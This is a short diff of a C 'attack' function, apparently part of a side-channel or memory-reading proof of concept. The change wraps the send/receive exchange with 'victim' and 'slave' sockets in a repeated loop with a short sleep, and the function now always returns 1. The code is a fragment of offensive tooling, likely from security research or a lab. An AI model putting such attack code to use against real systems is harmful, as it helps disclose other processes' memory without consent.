@@ -116,8 +116,8 @@ int attack(int victim, int slave, int offset)
     assert(victim);
     assert(slave);
 
-    int requests[REQUEST_SIZE] = {};
-    requests[REQUEST_SIZE - 1] = offset;
+//    int requests[REQUEST_SIZE] = {};
+//    requests[REQUEST_SIZE - 1] = offset;
     
     /*
      * No error recovery needed here:
@@ -125,13 +125,29 @@ int attack(int victim, int slave, int offset)
      * 2. If recv fails, it does not matter - we are not interested
      *    in any results on this side.
      */
-    int tmp;
-    int found;
-    send(victim, requests, sizeof(requests), 0);
-    send(slave,  requests, sizeof(requests), 0);
-    recv(victim, &tmp,     sizeof(tmp),   0);
-    recv(slave,  &found,   sizeof(found), 0);
+//    int tmp;
+//    int found;
+//    send(victim, requests, sizeof(requests), 0);
+//    send(slave,  &tmp,   sizeof(tmp),   0);
+//    recv(victim, &tmp,   sizeof(tmp),   0);
+//    recv(slave,  &found, sizeof(found), 0);
+//
+//    return found;
+    
+    for (int i = 0; i < BYTE_READ_REPEATS; i++)
+    {
+        int requests[REQUEST_SIZE] = {};
+        requests[REQUEST_SIZE - 1] = offset;
 
-    return found;
+        int tmp;
+        int found;
+        send(victim, requests, sizeof(requests), 0);
+        send(slave,  requests, sizeof(requests), 0);
+        recv(victim, &tmp,   sizeof(tmp),   0);
+        recv(slave,  &found, sizeof(found), 0);
+
+        usleep(5000);
+    }
+    return 1;
 }
 
